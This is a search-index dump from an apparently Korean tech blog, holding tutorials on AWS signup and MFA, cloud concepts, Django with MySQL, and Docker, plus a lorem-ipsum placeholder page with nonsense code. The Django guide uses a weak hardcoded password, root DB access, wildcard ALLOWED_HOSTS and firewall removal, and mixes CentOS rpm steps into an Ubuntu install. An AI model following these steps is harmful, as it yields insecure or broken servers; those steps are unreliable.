입력합니다. 여기서 amazon에서 $1를 뺏어감니다\u0026hellip;. 후 실습예제 중에서는, 최대한 프리 티어를 기준으로 사용하지만, 특정 서비스 사용시 과금이 발생할 수 있습니다.      각 항목에 알맞은 정보를 기입 후, 인증을 진행합니다.      인증 진행 후, 기본 플랜을 선택합니다.      가입이 완료되면 다시 초기화면으로 돌아와 이메일 주소와 암호를 입력 후 진행합니다.      다음으로는 서비스를 다루기 앞서, 보안을 위해 MFA를 등록하겠습니다. 메인 창에서 IAM을 입력 후, IAM에 진입합니다.      IAM 진입이 완료되면, 중앙에 메인페이지에 보이는 루트 계정에서 MFA 활성화를 선택 후, MFA 관리를 클릭합니다.      멀티 팩터 인증 ( MFA )를 클릭 후, MFA 활성화를 클릭합니다. 혹시 다른 인증방법이 궁금하신 분들은 Link를 참조하세요.      가상 MFA 디바이스를 클릭 후, Authenticator를 구글 스토어 혹은 앱 스토어에서 다운로드 받습니다.      앱을 실행 시킨 후, QR 코드를 입력 후, MFA 코드를 2차례 입력합니다.      등록이 완료되면 다음과 같이 일련번호를 확인 할 수 있습니다.      계정을 로그아웃 후, 다시 로그인하면 다음과 같이 MFA코드를 입력창이 나옵니다. 설치한 Authenticator을 실행 후, MFA 값을 입력하면 성공적으로 로그인이 가능합니다.    다음으로는 IAM을 통한 사용자 계정생성에 대해 알아보도록 하겠습니다.  "}),a.add({id:9,href:'/docs/azure/azuretraining/base/',title:"Azure ",content:"****   ****         ****        "}),a.add({id:10,href:'/docs/azure/microsoftazure/',title:"Azure docs",content:"  Azure     Azure Docs\n  Azure Computing\n  Azure Networking\n  Azure Mobile\n  Azure DataBase\n  Azure Storage\n  Azure Web\n  Azure IOT\n  Azure BigData\n  Azure AI\n  Azure DevOps\n  Azure HybridCloud\n       Azure Training   Az-900 : CloudComputing\n  Az-900 : Region\n  Azure\n      "}),a.add({id:11,href:'/docs/aws/amazonwebservice/aws%EB%9E%80/',title:"CloudComputing과 AWS",content:"AWS 란?   Amazon Web Services ( AWS )  AWS  AWS는 Amazon에서 제공하는 클라우드 서비스로, 네트워크를 기반으로 가상 컴퓨터와 스토리지를 비롯한 다양한 서비스를 제공 합니다.    Cloud Computing 와 AWS    AWS에 대해 공부하기 앞서, 우리는 Cloud Computing이 무엇이고, 어떠한 개념에 대해 알고 있어야 합니다. 그 이유는 AWS가 클라우드 컴퓨티 그 자체이기 때문이죠.\n  클라우드 컴퓨팅 ( Cloud Computing : 이하 클라우드 )은 컴퓨터 리소스의 이용 형태로, 클라우드는 컴퓨터의 계산 리소스, 스토리지, 애플리케이션 처리를 네트워크 기반 서비스로 제공하는 것을 뜻 합니다.\n  클라우드 컴퓨팅의 클라우드는 \u0026ldquo;구름 ( Cloud )\u0026ldquo;를 의미하는 것으로, Cloud는 Google의 최고 경영 책임자인 에릭 슈미트가 2006년 8월 \u0026ldquo;인터넷에 접속해서 다양한 리소스를 사용할 수 있게 하는 구조\u0026quot;를 구름으로 예를 들면서 널리 사용되게 되었으며, 현재는 대표적으로 Google의 GCP ( Google Cloud Platform ), Microsoft의 Azure, Amazon의 AWS가 널리 사용되어지고 있습니다.\n  예전부터 네트워크를 이용한 컴퓨터 리소스를 공유하는 개념은 존재해왔지만, 클라우드란 용어가 정착하게 된 결정적인 이유는, 브로드 밴드 네트워크의 일반화, 하드웨어 및 소프트웨어의 진화와 구글과 같은 플랫폼을 제공하는 기업 등의 여러 상호작용의 결과라고 할 수 있습니다.\n     Cloud Computing의 종류   클라우드 컴퓨팅에도 여러 서비스의 종류가 있고, 이들 중 위의 그림에 나타난 클라우드 컴퓨팅을 대표하는 서비스에 대해 알아보도록 하겠습니다.     Infratructure as a Service : IaaS    IaaS는 가상 서버 또는 스토리지 등의 리소스를 인터넷을 기반으로 제공하는 서비스를 의미하며, 추가적으로 네트워크 서비스 자체를 포함하기도 합니다.\n  IaaS의 가장 큰 장점은 물리적인 하드웨어를 관리할 필요가 없음에도, 직접적으로 컴퓨터 리소르를 사용할 수 있다는 점입니다.\n  IaaS는 위의 그림에서처럼 가장 하단에 위치하며 클라우드 레이어로는 갖아 아래의 기초적인 부분을 담당합니다. 즉, IaaS는 물리 장치에 가장 가까운 서비스라 할 수 있습니다.\n    Platform as a Service : PaaS   PaaS는 데이터베이스 또는 애플리케이션 서버 등의 미들웨어를 제공하는 서비스입니다.\n  OS와 미들웨어의 관리는 서비스 제공자가 하며, 사용자는 미들웨어만을 직접 사용할 수 있습니다.\n    Software as as Service : SaaS   SaaS는 소프트웨어 또는 애플리케이션의 기능을 인터넷을 통해 제공합니다.\n  SaaS는 내부적으로 메일 서비스, 큐 서비스, 업무 관리 시스템 등으로 다양하게 분류되어 있습니다.\n  SaaS를 제공하는 것을 SaaS제공자 ( Provider )라고 부릅니다. 이는 ASP ( Application Service Provider )와 동일한 것으로, 다만 SaaS의 제공자는 클라우드라는 것에 조금 더 비중을 두어 말하는 것이 차이점이라 할 수 있습니다.\n     On Premise 서버와 Cloud 서버의 차이     On Premise ( 물리 서버 )라고하면 일반적으로 물리 머신을 한정해서 말하는 것이므로, 네트워크 장치 또는 전력 설비 등을 포함하는 의미로 On Premise라는 용어가 되었습니다.\n  On Premise는 조직 내부에서 사용할 목적으로 준비한 설비를 나타내며, 기업 내부에서 일반적으로 사용하는 형태라서 이전에는따로 명칭이 없었지만, 클라우드가 등장하면서 기존에 사용하던 형태를 나타내는 용어로 사용도기 시작했습니다.\n  그러면, On premise와 Cloud의 가장 큰 차이는 무엇일까요?, 그것은 크게 2가지로 소유자 ( Owner )와 용량 ( Capacity ) 입니다.\n     소유자 ( Owner )    On Premise와 Public의 첫 번째 차이는 소유자로, On Premise의 경우 리소스 등의 예외가 있을 수는 있지만, 일반적으로 설비를 준비한 기업이 소유하고 있습니다. 반면, Public은 해당 깅버이 모든 리소스를 소유하고, 해당 리소스를 서비스로 만든 것을 사용하는 형태로, 소유자와 사용자가 다르다고 할 수 있습니다.\n  소유자와 사용자가 다르다는 차이점은 다방면에서 영향을 끼칠 수 있습니다.\n 먼저 초기 비용의 차이입니다. On Premise는 서버 등을 이용할 때, 초기에 물리 장치를 구매해서 도입해야 하며, 여러 비용이 발생할 수 있습니다. 반면, AWS는 사용자가 물리 잧이를 구매할 필요가 없어 초기 비용이 거의 들지 않습니다. 이는 Public 차원에서 미리 물리 장치에 투자한 자산을 서비스 제공이라는 형태로 분산해서 회수하는 형태이기 때문입니다.    이어서 서버 등의 조달 기간입니다. On Premise의 경우는 견적을 받고 발주 및 배송에 몇 주에서 몇 달의 시간이 걸리는 것이 일반적이지만, 반면 Public 환경에서는 웹 브라우저, 콘솔, 프로그램에서 호출하면 몇 분 내로 조달이 완료됩니다.    이와 마찬가지로 사용하고 있는 서버를 추가하거나, 크기를 변경할 때도 동일합니다. On Premise의 경우는 시간과 비용이 들어가지만, 서버의 성능을 Scale Up하거나 이와 반대되는 경우, 혹은 서버자체를 새로 구매해야할 때, Public 상에서는 버튼 하나로 변경 및 추가 구매가 가능합니다.     Option On Premises Public     비용 초기에 모두 필요함 초기 비용은 따로 필요 없으며, 종량제 과금에 따라 비용이 분산되어 발생   서버 조달 기간 몇 주- 몇달 몇 분   서버 추가/ 변경 시간과 비용이 들어감 추가/ 변경과 관련된 비용이 필요하지 않음         용량 ( Capacity )    On Premise와 AWS에서는 소유와 사용에 따라 비용이 발생하는 방식이 다릅니다. 추가로 서버 조달 기간 또는 조달 비용도 다릅니다. 따라서 용량 ( Capacity ) 설계도 전혀 다르게 해야합니다.\n  On Premise는 서버 조달, 추가/변경으로 인한 기간이 길고, 비용이 크기 때문에 자원을 많이 사용할 때의 필요 자원에 맞춰서 모든 것을 준비해야 합니다. 반면 Public은 자원의 추가/ 변경이 쉬우며, 따라서 실제 수요에 맞춰 자원을 크게 만들 수도 있고, 작게 만들 수도 있습니다. 또한 대부분의 Public 플랫폼은 종량제 비용이므로 작게 만들면 비용을 줄일 수 있습니다.\n  즉, Public 인프라를 효율적으로 활용하려면, On Premise에서와 다르게 해야한다는 점 을 확실하게 이해해야 합니다.\n     렌탈 서버 ( 공유 서버 )와 Public의 차이   렌탈 서버    위에서 Public 인프라가 다른 소유자의 자원을 사용한다는 점을 말씀드렸습니다. 그렇다면 우리가 흔히 알고 있는 호스팅 서버 혹은 공용 서버라 불리는 렌탈서버와 다른 점을 무엇일까요?.\n  먼저 렌탈서버란 1대의 서버를 여러 사용자가 공용으로 사용 하는 형태로, 주로 웹 서버나 메일 서버를 사용하는 것이 일반적이었습니다.\n  즉, 1대의 물리서버를 모두 점유하는 전용 서버의 위에 가상 서버를 여러 개를 만들어, 해당 가상 서버를 점유하는 가상 전용 서버( VPS )라는 형태를 취하는 것이 렌탈 서버입니다.\n  그렇다면, 이러한 렌탈 서버에 문제점은 무엇일까요? 그것은 크게 3가지로 말씀드릴수 있는데, 낮은 자유도, 보안문제, 다른 사용자로 부터의 영향으로 정리할 수 있습니다.\n  먼저, 낮은 자유도라는 것은 공용 서버를 이용할 때에는 root 계정이 아닌, 사용자 권한의 계정만 부여되므로, 이는 애플리케이션이나 미들웨어를 자신이 원할 때 변경 등이 불가능하며, 자신이 원하는 대로 환경을 바꿀 수 없습니다.\n  이어 보안 문제또한 위에 이어지는 문제로, 기본적으로 자신이 원하는 환경을 구축할 수 없으므로, 보안 대책도 업자에게 맡기게됩니다. 이에 따라 취약성이 있는 미들웨어를 사용하고 있다는 것을 파악하여도, 사용자는 이를 해결하기 어려우며, 또한 만약 다른 사람이 만든 애플리케이션에 취약점이 발견되면, 그 취약점에 영향을 받을 수도 있습니다.\n  마지막으로는 다른 사용자로부터의 영향입니다. 만약 Apache를 사용하는 웹 서버를 이용할 때 공용 서버를 사용하면 유저마다 프로세스를 사용하는 것이 아닌, 모두 동일한 프로세스를 분할해서 사용하게 되는 데, 만약 1명의 사용자가 부하처리, CGI 등을 사용한 프로그램 처리가 폭주하면 모든 사용자는 영향을 받게 되어, 서비스가 중단될 수 있어, 공용 서버는 다른 사용자에게 영향을 받기 쉬운 형태라 할 수 있습니다.\n       전용 서버와 가상 전용 서버    위와 같은 렌탈 서버의 문제를 해결하기위해 전용서버와 가상 전용 서버라는 형태가 등장하게 되었습니다.\n  전용 서버와 가상 전용 서버는 관리자의 권한이 부여되어 있는 사용자 계정이 생성이 가능하여, 자유도가 높으며 스스로 관리가 가능합니다.\n  한편 전용서버는 1대의 물리 서버를 1명의 사용자에게 주어야 하기에, 비용적으로 부담이 크며, 이 때문에 가상화 기술을 사용해 1대의 물리 서버를 여러 대의 가상 서버로 분할해 비용을 줄인 것을 가상 전용 서버입니다.\n  또한 전용서버는 한 대의 물리서버이므로 다른 사용자의 영향을 전혀 받지 않으며, 반면 가상 전용 서버는 어느 정도의 영향을 받을 수 있지만, 렌탈 서버, 즉 공용 서버에 비해서는 거의 영향을 받지 않는 다고 할 수 있습니다.\n     옵션 공용 서버 전용 서버 가상 전용 서버     사용 형태 1대의 물리 서버를 분할해서 사용 1대의 물리 서버 점유 1대의 물리 서버 위에 있는 가상 서버를 점유   비용 적음 높음 중간   자유도 거의 없음 높음 높음   보안 관리 불가능 관리 가능 관리 가능   다른 사용자의 영향 높음 없음 거의 없음     렌탈 서버와 AWS ( Public )의 차이    EC2라는 AWS의 가상 컴퓨트 서비스는 가상화 기술을 사용해 1대의 물리 컴퓨터 위에 여러 개의 가상 컴퓨터를 만들어서 사용합니다.\n  **여기에서 사용자는 관리자 권한을 가진 계정을 사용할 수 있으며, 해당 가상 컴퓨터 내부의 모든 것을 관리할 수 있습니다. 따라서 이러하 면에서 EC2는 가상 전용 서버와 비슷하다 할 수 있습니다.\n  그러나 EC2는 디스크를 동적으로 추가하거나, CPU와 메모리를 다른 인스턴스 유형으로 쉽게 변경하는 등의 기존의 렌탈 서버에 없는 기능이 많습니다. 또한, 가상 머신 이미지를 생성해서 백업하고, 백업한 이미지를 사용하여 여러 서버로 복제하는 등의 서비스도 이용이 가능합니다. 이와 같이 AWS와 같은 대부분의 클라우드 컴퓨팅을 서비스를 하는 기업의 대부분은 위에 렌탈 서버가 제공하는 서비스 뿐만아닌 추가적인 서비스를 더 제공하는 형태라고 할 수 있습니다.\n     Private Cloud와 Public Cloud     크게 클라우드의 형태는 Private Cloud와 Public Cloud가 있습니다. 이는 말을 정의하는 사람에 따라 의미가 조금씩 다를 수 있으며, 일반적인 의미에서는 누구에게 서비스를 제공하는 가에 따라 정의됩니다.\n  크게 Public Cloud는 GCP, Azure, AWS와 같이 누구에게나 서비스를 제공하는 형태의 서비스를 의미하고 Priavte Cloud는 기업 사내망, 즉 기업 전용서버로 해석되기도 하며, Public과는 반대로 특정 기업/ 조직 전용으로 제공되는 서비스를 의미합니다.\n  이 뿐만 아니라 현재는 이 둘을 혼용으로 사용하는 Hybrid Cloud와 특정 업종의 기업들이 함께 운영해나가는 Community Cloud라는 용어가 있습니다.\n     AWS에서의 Private Cloud의 정의    AWS를 제공하는 Amazon은 Public과 Private라는 용어를 따로 사용하고 있지 않습니다. 이는 클라우드라는 용어가 없었던 때부터 서비스를 시작한 Amazon의 자부심이라 할 수 있겠으며, 일반적으로 AWS를 대표적인 Public Cloud Service로 분류합니다.\n  AWS 내에는 Virtual Private Cloud ( VPC )라는 서비스가 있는 데, 이는 가상 네트워크를 생성하여 IP 주소 범위, 라우트 테이블, 네트워크 게이트웨이 등을 자유롭게 설정할 수 있게 해주는 서비스로, VPC를 사용하면 기존 데이터 센터와 회사 내부에 만들던 것과 같은 방식으로 네트워크를 만들 수 있습니다. 경우에 따라서는 이를 Private 클라우드라 표현하기도 합니다.\n     AWS 서비스의 구성    AWS는 이미 30개가 넘는 서비스가 있으며, 해마다 새로운 서비스와 기능이 추가되므로 서비스의 전체적인 구성을 파악하는 것은 굉장히 힘듭니다.\n  하지만 AWS를 사용할 때에 대한 기본적인 개념, 사고방식 등은 베이스로 학습한 후에 진행하는 것이 보다 빠른 이해를 도울 것입니다.\n    "}),a.add({id:12,href:'/docs/development/web/django/django/',title:"Django Install",content:"Djnago  Djnago 설치  설치환경   Ubuntu 18.04\n  mysql 5.7\n  python 3.6.8\n  pip3 9.0.3\n  django 2.1\n   Ubuntu 설정   apt update -y\n  apt upgrade -y\n  apt install python3 -y\n  apt install python3-pip -y\n  apt install gcc -y\n  apt install python-dev -y\n  apt install libmysqlclient-dev -y\n  apt install rpm -y\n    mysql 설치   wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm\n  rpm -ivh mysql57-community-release-el7-11.noarch.rpm\n  apt -y install mysql-server\n  systemctl start mysql\n   mysql 임시 비밀번호와 비밀번호 변경   임시 비밀번호 입력 후 변경할 비밀번호를 입력\n  cat /var/log/mysqld.log | grep root@localhost ( 임시 비밀번호가 나오지 않을 경우 엔터 입력 )\n  mysql_secure_installation\n  mysql -u root -p 비밀번호 입력\n   DB 사용을 위한 사용자 추가 mysql\u0026gt; create user \u0026#39;Django\u0026#39;@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; mysql\u0026gt; grant all privileges on *.* to \u0026#39;Django\u0026#39;@\u0026#39;localhost\u0026#39;; 한글 입력 출력 설정  mysql을 실행하여 아래와 같이 입력  mysql\u0026gt; show variables like \u0026#39;c%\u0026#39;;   몇몇 설정이 latin1으로 되어있는 것을 확인할 수있다.\n  테이블을 수정하면 일시적으로 한글 입력을 확인할 수 있다.\n  영구적으로 적용하기 위해 config파일을 수정할 필요가 있다.\n   /etc/mysql/mysql.conf.d/ 에 다음과 같은 파일들을 추가한다.  # client.cnf [client] default-character-set=utf8 # mysqld.cnf [mysqld] character-set-server=utf8 collation-server=utf8_general_ci init_connect=SET collation_connection=utf8_general_ci init_connect=SET NAMES utf8 # mysqldump.cnf [mysqldump] default-character-set=utf8 # mysql.cnf [mysql] default-character-set=utf8  mysql 재시작 및 확인  systemctl restart mysql mysql -u root -p mysql\u0026gt; show variables like \u0026#39;c%\u0026#39;; mysql\u0026gt; status;   개발환경 설정   virtualenv 환경\npip3 install --user virtualenv source .profile # root 사용자면 안됨 X 일반유저 프로파일 virtualenv ve  virtualenv 활성화 비활성화\nsource ve/bin/activate # 활성화 (ve) deactivate # 비활성화  django 2.1 설치\n(ve) pip3 install django==2.1 # ve가상환경에서 pip3 ( python3 )로 장고 설치  virtualenv 환경에 설치된 목록 확인\n(ve) pip3 freeze # virtualenv 목록확인  django에서 mysql을 사용하기위한 모듈 설치\n(ve) pip3 install mysqlclient  오류가 난다면 아래를 설치한 뒤 다시 시도한다.\napt install -y gcc\napt install -y python-devel mysql-devel\napt install -y python3-devel\r\r      Django Project  Django Project start  startproject (ve) django-admin startproject Django (ve) cd Django   테스트 서버 실행  ./manage.py runserver 0.0.0.0:8000   내부가 아닌 다른 곳에서 접속을 원하는 경우  vi Django/setting.py에서 ALLOWED_HOSTS = ['*']로 편집해준다. 방화벽을 해제한다.      설정파일 settings.py   settings.py는 파일 장고의 전반적인 설정을 다룬다. 시간과 언어를 바꿔준다.  LANGUAGE_CODE = \u0026#39;en-us\u0026#39; --\u0026gt; LANGUAGE_CODE = \u0026#39;ko-kr\u0026#39; TIME_ZONE = \u0026#39;UTC\u0026#39; --\u0026gt; \u0026#39;Asia/Seoul\u0026#39; USE_I18N = True USE_L10N = True USE_TZ = True STATIC_URL = \u0026#39;/static/\u0026#39;  DB 연동을 위해 설정 값을 입력한다.\nDATABASES = { \u0026#39;default\u0026#39;: { \u0026#39;ENGINE\u0026#39;: \u0026#39;django.db.backends.mysql\u0026#39;, \u0026#39;NAME\u0026#39;: \u0026#39;DjangoDB\u0026#39;, # DB 명을 입력한다. \u0026#39;USER\u0026#39;: \u0026#39;root\u0026#39;, # SQL 유저의 이름을 입력한다. \u0026#39;PASSWORD\u0026#39;: \u0026#39;qwer1234\u0026#39;, # 유저 패스워드를 입력한다. \u0026#39;PORT\u0026#39;: \u0026#39;3306\u0026#39;, \u0026#39;HOST\u0026#39;: \u0026#39;localhost\u0026#39;, \u0026#39;OPTIONS\u0026#39;: { \u0026#39;init_command\u0026#39;: \u0026#34;SET sql_mode=\u0026#39;STRICT_TRANS_TABLES\u0026#39;\u0026#34;, }, } } DB 연동을 위해 DB를 생선한다.\n 슈퍼 계정 생성\nmysql\u0026gt; 확인\n./manage.py runserver 0.0.0.0:8000 mysql 연동 확인 mysql -u Django -p\n"}),a.add({id:13,href:'/docs/development/web/django/basic/',title:"Django란?",content:"Django    Django   파이썬으로 만들어진 무료 오픈소스 웹 애플리케이션 프레임워크 모델\u0026ndash;뷰\u0026ndash;컨트롤러 ( MVC ) 패턴을 따름 장고는 컴포넌트의 재사용 및 플러그인화 가능성을, 빠른 개발을 위해 계발 웹 개발 시 많이 사용되며, 번거로운 요소들을 새로 개발할 필요 없이 내장된 기능만을 이용해 빠른 개발이 가능   MTV ( Model-Template-View )    Model\n 데이터에 관한 정보를 담으며, 데이터에 대한 접근, 검증, 작동과 데이터 사이의 관계를 정의하며, 각각의 모델은 데이터베이스에서 테이블에 해당    Template\n 데이터가 어떻게 표시되는 지를 정의, 템플릿은 사용자에게 실제로 보여지는 웹 페이지나 문서를 다룸    View\n 어떤 데이터가 표시될 것인지를 쟁의, 뷰는 HTTP 응답( response )를 반환해야 하며, 응답의 종류는 웹 페이지, 리디렉션, 문서 등 다양한 형태가 가능 뷰는 제네릭 뷰 ( generic view )라고 하며 원하는 재네릭 뷰를 상속한 클래스 뷰를 생성하여 사용할 수 있음        Django 프로젝트 기본 파일 구조  doc/ Project 포함 디렉토리 doc/ Project Root 디렉토리 __pycache__/ python3 Compile 디렉토리 __init__.py Python3 패키티 디렉토리 명시 파일 settings.py Django 프로젝트 파일 urls.py Django 프로젝트 URL 명시 파일 wsgi.py Djnago 웹 서비스 호환 파일 db.sqlite3 SQLite DB 파일 manage.py Django 프로젝트 실행 파일      Django 명령어   기본명령어 python manage.py [ 수행할 명령어 ]  웹 서버 작동\npython manage.py runserver [ 0.0.0.0:8000 ]  앱 생성\npython manage.py startapp [ 앱 이름 ] 생성시 사용을 위해서는 settings.py의 INSTALLED_APPS에 등록해야됨  Django DB 모델 변경사항 적용\npython manage.py migrate  Django DB 모델 클래스 생성\npython manage.py inspectdb [ 테이블 명 ] python manage.py inspectdb boards_v \u0026gt; testapp/models.py  Django 관리자 계정 생성\npython manage.py createsuperuser  DJnago 정적 파일배치\npython manage.py collectstatic /statc/의 정적파일을 배치한다.  ㅁㅁ\npython manage.py  ㅁㅁ\npython manage.py "}),a.add({id:14,href:'/docs/',title:"Doc",content:"Introduction Ferre hinnitibus erat accipitrem dixi Troiae tollens Lorem markdownum, a quoque nutu est quodcumque mandasset veluti. Passim inportuna totidemque nympha fert; repetens pendent, poenarum guttura sed vacet non, mortali undas. Omnis pharetramque gramen portentificisque membris servatum novabis fallit de nubibus atque silvas mihi. Dixit repetitaque Quid; verrit longa; sententia mandat quascumque nescio solebat litore; noctes. Hostem haerentem circuit plenaque tamen.\n Pedum ne indigenae finire invergens carpebat Velit posses summoque De fumos illa foret  Est simul fameque tauri qua ad Locum nullus nisi vomentes. Ab Persea sermone vela, miratur aratro; eandem Argolicas gener.\nMe sol Nec dis certa fuit socer, Nonacria dies manet tacitaque sibi? Sucis est iactata Castrumque iudex, et iactato quoque terraeque es tandem et maternos vittis. Lumina litus bene poenamque animos callem ne tuas in leones illam dea cadunt genus, et pleno nunc in quod. Anumque crescentesque sanguinis progenies nuribus rustica tinguet. Pater omnes liquido creditis noctem.\nif (mirrored(icmp_dvd_pim, 3, smbMirroredHard) != lion(clickImportQueue,\rviralItunesBalancing, bankruptcy_file_pptp)) {\rfile += ip_cybercrime_suffix;\r}\rif (runtimeSmartRom == netMarketingWord) {\rvirusBalancingWin *= scriptPromptBespoke + raster(post_drive,\rwindowsSli);\rcd = address_hertz_trojan;\rsoap_ccd.pcbServerGigahertz(asp_hardware_isa, offlinePeopleware, nui);\r} else {\rmegabyte.api = modem_flowchart - web + syntaxHalftoneAddress;\r}\rif (3 \u0026lt; mebibyteNetworkAnimated) {\rpharming_regular_error *= jsp_ribbon + algorithm * recycleMediaKindle(\rdvrSyntax, cdma);\radf_sla *= hoverCropDrive;\rtemplateNtfs = -1 - vertical;\r} else {\rexpressionCompressionVariable.bootMulti = white_eup_javascript(\rtable_suffix);\rguidPpiPram.tracerouteLinux += rtfTerabyteQuicktime(1,\rmanagementRosetta(webcamActivex), 740874);\r}\rvar virusTweetSsl = nullGigo;\r Trepident sitimque Sentiet et ferali errorem fessam, coercet superbus, Ascaniumque in pennis mediis; dolor? Vidit imi Aeacon perfida propositos adde, tua Somni Fluctibus errante lustrat non.\nTamen inde, vos videt e flammis Scythica parantem rupisque pectora umbras. Haec ficta canistris repercusso simul ego aris Dixit! Esse Fama trepidare hunc crescendo vigor ululasse vertice exspatiantur celer tepidique petita aversata oculis iussa est me ferro.\n"}),a.add({id:15,href:'/docs/docker/docker/',title:"Docker",content:""}),a.add({id:16,href:'/docs/docker/docker/docker/docker-1/',title:"Docker란?",content:"Docker란?    Docker      도커란 컨테이너 기반의 오픈소스 가상화 플랫폼으로 컨테이너형 가상화 기술을 구현하기 위해 상주 어플리케이션과 이 어플리케이션을 조작하기 위한 명령행 도구로 구성되는 프로덕트입니다.\n  컨테이너라 하면 배에 실는 네모난 화물 수송용 박스를 생각할 수 있는데 각각의 컨테이너 안에는 다양한 화물을 넣을 수 있고 규격화되어 컨테이너선이나 트레일러등 다양한 운송수단으로 쉽게 옮길 수 있습니다.\n  서버에서 이야기하는 컨테이너도 이와 비슷한데 다양한 프로그램, 실행환경을 컨테이너로 추상화하고 동일한 인터페이스를 제공하여 프로그램의 배포 및 관리를 단순하게 해줍니다. 백엔드 프로그램, 데이터베이스 서버, 메시지 큐등 어떤 프로그램도 컨테이너로 추상화할 수 있고 조립PC, AWS, Azure, Google cloud등 어디에서든 실행할 수 있습니다.\n     Docker Container     컨테이너는 격리된 공간에서 프로세스가 동작하는 기술로, 가상화 기술의 하나지만 기존 방식과는 차이가 있습니다.\n  우리에게 익숙한 VMware나 VirtualBox 같은 가상머신은 호스트 OS위에 게스트 OS전체를 가상화하여 사용하는 방식입니다. 이와 같은 방식은 여러 OS를 가상화할 수 있고 비교적 사용법이 간단하지만 무겁고 느려서 운영환경에서는 사용하기 힘들었습니다..\n  이와 같은 상황을 개선하기 위해 CPU의 가상화 기술인 ( HVM )을 이용한 KVM ( Kernel-basesd Virtual Machine )과 반가상화 ( Paravirtualiztion ) 방식의 Xen이 등장하였고, 이러한 방식은 게스트 OS가 필요하긴 하지만 전체 OS를 가상화 하는 방식이 아니였기 때문에 호스트형 가상화 방식에 비해 성능을 향상 시킬 수 있었습니다. 현재는 이 기술이 OpenStack, AWS, Rackspace와 같은 클라우드 서비스에서도 가상 컴퓨팅 기술의 기반이 되었습니다.\n  하지만 전가상화, 반가상화는 모두 추가적인 OS를 설치하여 가상화하는 방법으로 성능문제를 야기시킬 수 있었습니다.\n  그리고 이를 개선하기 위해 프로세스를 격히하는 방식이 등장하였고, 이를 컨네이너라고 합니다.\n     상단의 그림처럼 OS를 사용할 경우 overhead의 가능성이 높아집니다.\n  하지만 컨테이너 방식은 단순히 프로세스를 격리시키기 때문에 가볍고 빠르게 동작하며, CPU나 메모리는 프로세스가 필요한 만큼만 추가로 사용하고 성능적으로도 거의 손실이 없습니다.\n  아래는 도커의 컨테이너형 가상화 기술의 대한 간략적인 설명입니다.\n 도커는 컨테이너형 가상화 기술을 사용합니다.. 도커가 등장하기 전에는 LXC가 유명했는 데, 도커도 초기에는 컨테이너형 가상화를 구현하는데 LXC를 런타임으로 사용했습니다. ( 현재는 runC ) 컨테이너형 가상화를 사용하면 가상화 소프트웨어 없이도 운영 체제의 리소스를 격리해 가상 운영체제로 만들 수 있습니다. 컨테이너를 만들면서 발생하는 오버헤드는 다른 가상화 소프트웨어보다 더 적습니다. LXC는 호스트 운영체제 가상화보다 성능면에서는 유리하다는 장점이 있지만 아직까지 이식성은 낮습니다.    LXC와 Docker의 차이점\n 호스트 운영체제의 영향을 받지 않는 실행 환경 DSL ( Dockerfile )을 이용한 컨테니어 구성 및 어플리케이션 배포 정의 이미지 버전 관리 레이어 구조를 갖는 이미지 포맷 프로그램 가능한 다양항 기능의 API       Docker Image     도커에서 가장 중요한 개념은 컨테이너와 함께 이미지라는 개념입니다.\n  이미지란 컨테이너 실행에 필요한 파일과 설정 값 등을 포함하고 있는 것으로, 상태 값을 가지지 않고 변하지 않습니다.\n  컨테이너 이미지를 실행한 상태라고 볼 수 있고 추가되거나 변하는 값들은 모두 컨테이너에 저장됩니다.\n  이미지는 말 그대로 컨테이너를 실행하기 위한 모든 정보를 가지고 있기 때문에, 더 이상 의존성 파일을 컴파일하고 추가적으로 설치할 필요가 적습니다.\n  도커의 이미지는 Docker hub에 등록하거나, Docker Registry 저장소를 직접 만들어 관리할 수 있으며, 누구나 쉽게 이미지를 만들고 배포할 수 있습니다.\n     레이어 저장방식   도커 이미지는 컨테이너를 실행하기 위한 모든 정보를 가지고 있기 때문에 보툥 수백메가에 용량을 가지고 있습니다. 처음 이미지를 다운 받을 때는 크게 부담이 되지 않지만, 기존 이미지에 파일 하나추가 되었을 때 다시 받아야 한다면 매우 비효율적일 수 밖에 없습니다.\n  도커는 이런 문제를 해결하기 위해 레이어 ( layer ) 라는 개념을 사용하고 유니온 파일 시스템을 이용하여 여러개의 레어를 하나의 파일시스템으로 사용할 수 있게 해줍니다.\n  여러개의 layer로 구성되고 파일이 추가되거나 수정되면 새로운 레이어가 추가되는 방식으로 레이어 저장방식을 통하면, 단순하지만 효율적인 설계가 가능해집니다.\n     Docker Architecture     Docker 사용에 의의   코드로 관리하는 인프라 ( Infrastructure as Code )와 불변 인프라 ( Immutable Infrastructure )   코드 기반으로 인프라를 정의한다는 개념입니다. 코드 기반으로 인프라를 구축하고 관리한다 하여도 항구적인 코드를 계속 작성하는 것은 운영 업무에 부담을 주기 쉽습니다.. 서버의 대수가 늘어날수록 모든 서버에 구성을 적용하는 시간도 늘어납니다. 어떤 시점의 서버 상태를 저장해 복제할 수 있게 하는 개념입니다. 도커는 인프라 실행에 걸리는 시간이 적은 만큼 구성을 수정하지 않고 인프라를 완전히 새로 만드는 불변 인프라와 궁합이 잘 맞는 장점을 가지고 있습니다.     어플리케이션과 인프라 묶어 구축하기  운영체자와 어플리케이션을 함께 담는 상자의 개념의 컨테이너를 사용합니다. 어플리케이션과 인프라를 함께 관리한 결과로 얻는 높은 이식성을 가지고 있습니다.     어플리케이션 구성 관리의 용이   일정 규모를 넘는 시스템은 주로 여러 개의 어플리케이션과 미들웨어를 조합하는 형태로 구성되어집니다. 즉, 여러 어플리케이션과 미들웨어를 조합하지 않으면 시스템을 구성할 수 없습니다. 결과적으로 시스템 전체에 대한 적절한 구성관리가 필요해졌는 데, 이에 대한 적합한 솔루션이 도커입니다.     Docker 오케스트레이션   여러 서버에 걸쳐 있는 여러 컨테이너를 관리하는 Docker 오케스트레이션 기능을 사용합니다. 여러 컨테이너를 사용하는 어플리케이션을 쉽게 관리할 수 있도록 도커 컴포즈 ( Dockercompose )라는 도구를 제공합니다.  Docker Compose : 여러 컨테이너를 관리하는 도구 Docker Swarm : 컨테이너 증가 혹은 감소, 노드의 리소스를 효율적으로 활용하기 위한 컨테이너 배치 및 로드 밸런싱 기능 등 실용적인 기능을 갖추고 있음 Kubernetes : 컨테이너 오케스트레이션 분야에서의 표준       새로운 개발 스타일   전보다는 어플리케이션 개발에 집중할 있는 분위기를 구현이 가능합니다. 인프라와 어플리케이션의 설정을 모두 코드 수준에서 쉽게 수정할 수 있게 할 수 있습니다. 기존에는 명확했던 인프라 엔지니어와 서버 사이드 엔지니어의 영역을 보다 쉽게 접근 및 